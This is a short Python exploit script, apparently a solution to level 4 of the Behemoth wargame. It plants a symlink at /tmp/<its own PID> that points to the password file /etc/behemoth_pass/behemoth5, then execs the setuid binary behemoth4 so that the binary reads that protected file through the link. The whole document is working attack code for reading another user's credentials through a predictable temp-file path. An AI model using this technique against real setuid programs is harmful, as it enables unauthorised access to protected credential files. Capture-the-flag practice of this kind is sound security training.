#! /usr/bin/env python

import os

pid = os.getpid()

os.symlink('/etc/behemoth_pass/behemoth5', '/tmp/%d' % pid)

os.execve('/behemoth/behemoth4', [], {})
